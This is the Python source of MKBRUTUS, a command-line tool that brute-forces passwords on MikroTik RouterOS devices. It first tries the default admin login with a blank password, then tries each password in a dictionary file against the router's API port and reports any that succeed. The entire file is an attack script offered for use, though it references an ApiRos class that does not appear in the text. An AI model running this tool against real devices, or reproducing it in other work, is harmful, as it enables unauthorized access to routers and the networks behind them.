# -*- coding: utf-8 -*-

#Check for Python3
import sys
# if sys.version_info < (3, 0):
#     sys.stdout.write("Sorry, Python 3.x is required to run this tool\n")
#     sys.exit(2)

import binascii
import getopt
import select
import socket
import time
import signal
import codecs


banner=('''          _   _   _   _  _____  ____ _   _  ____ _   _ _____
         |  \/  || | / /| ___ \ ___ \ | | |_   _| | | /  ___|
         | .  . || |/ / | |_/ / |_/ / | | | | | | | | \ `--.
         | |\/| ||    \ | ___ \    /| | | | | | | | | |`--. \\
         | |  | || |\  \| |_/ / |\ \| |_| | | | | |_| /\__/ /
         \_|  |_/\_| \_/\____/\_| \_|\___/  \_/  \___/\____/

                      Mikrotik RouterOS Bruteforce Tool 1.0.2
           Ramiro Caire (@rcaire) & Federico Massa (@fgmassa)
                    http://mkbrutusproject.github.io/MKBRUTUS
       ''')

def usage():
    print('''
    NAME
    \t MKBRUTUS.py - Password bruteforcer for MikroTik devices or boxes running RouterOS\n
    USAGE
    \t python mkbrutus.py [-t] [-p] [-u] [-d] [-s] [-q]\n
    OPTIONS
    \t -t, --target \t\t RouterOS target
    \t -p, --port \t\t RouterOS port (default 8728)
    \t -u, --user \t\t User name (default admin)
    \t -h, --help \t\t This help
    \t -d, --dictionary \t Password dictionary
    \t -s, --seconds \t\t Delay seconds between retry attempts (default 1)
    \t -q, --quiet \t\t Quiet mode
    ''')


def error(err):
    print(err)
    print("Try 'mkbrutus.py -h' or 'mkbrutus.py --help' for more information.")


def signal_handler(signal, frame):
    print(" Aborted by user. Exiting... ")
    sys.exit(2)


def run(pwd_num):
    run_time = "%.1f" % (time.time() - t)
    status = "Elapsed Time: %s sec | Passwords Tried: %s" % (run_time, pwd_num)
    bar = "_"*len(status)
    print(bar)
    print(status + "\n")

def main():
    print(banner)
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:p:u:d:s:q", ["help", "target=", "port=", "user=", "dictionary=", "seconds=", "quiet"])
    except getopt.GetoptError as err:
        error(err)
        sys.exit(2)

    if not opts:
        error("ERROR: You must specify at least a Target and a Dictionary")
        sys.exit(2)

    target = None
    port = None
    user = None
    dictionary = None
    quietmode = False
    seconds = None

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit(0)
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-p", "--port"):
            port = arg
        elif opt in ("-u", "--user"):
            user = arg
        elif opt in ("-d", "--dictionary"):
            dictionary = arg
        elif opt in ("-s", "--seconds"):
            seconds = arg
        elif opt in ("-q", "--quiet"):
            quietmode = True
        else:
            assert False, "error"
            sys.exit(2)

    if not target:
        error("ERROR: You must specify a Target")
        sys.exit(2)
    if not dictionary:
        error("ERROR: You must specify a Dictionary")
        sys.exit(2)
    if not port:
        port = 8728
    if not user:
        user = 'admin'
    if not seconds:
        seconds = 1

    print("[*] Starting bruteforce attack...")
    print("-" * 33)

    # Catch KeyboardInterrupt
    signal.signal(signal.SIGINT, signal_handler)

    # Looking for default RouterOS creds
    defcredcheck = True

    # Get the number of lines in file
    count = 0
    dictFile = codecs.open(dictionary,'rb', encoding='utf-8', errors='ignore')
    while 1:
        buffer = dictFile.read(8192*1024)
        if not buffer: break
        count += buffer.count('\n')
    dictFile.seek(0)

    items = 1
    for password in dictFile.readlines():
        password = password.strip('\n\r ')
        s = None
        for res in socket.getaddrinfo(target, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res
            try:
                 s = socket.socket(af, socktype, proto)
                 # Timeout threshold = 5 secs
                 s.settimeout(5)
            except (socket.error):
                s = None
                continue
            try:
                 s.connect(sa)
            except (socket.timeout):
                print("[-] Target timed out! Exiting...")
                s.close()
                sys.exit(1)
            except (socket.error):
                print("[-] SOCKET ERROR! Check Target (IP or PORT parameters). Exiting...")
                s.close()
                sys.exit(1)
        dictFile.close(  )
        apiros = ApiRos(s)

        # First of all, we'll try with RouterOS default credentials ("admin":"")
        while defcredcheck:
            defaultcreds = apiros.login("admin", "")
            login = ''.join(defaultcreds[0][0])

            print("[-] Trying with default credentials on RouterOS...")
            print()

            if login == "!done":
                print ("[+] Login successful!!! Default RouterOS credentials were not changed. Log in with admin:<BLANK>")
                sys.exit(0)
            else:
                print("[-] Default RouterOS credentials were unsuccessful, trying with " + str(count) + " passwords in list...")
                print("")
                defcredcheck = False
                time.sleep(1)

        loginoutput = apiros.login(user, password)
        login = ''.join(loginoutput[0][0])

        if not quietmode:
            print("[-] Trying " + str(items) + " of " + str(count) + " Paswords - Current: " + password)

        if login == "!done":
            print("[+] Login successful!!! User: " + user + " Password: " + password)
            run(items)
            return
        items +=1
        time.sleep(int(seconds))

    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
    run(count)


if __name__ == '__main__':
    t = time.time()
    main()
    sys.exit()
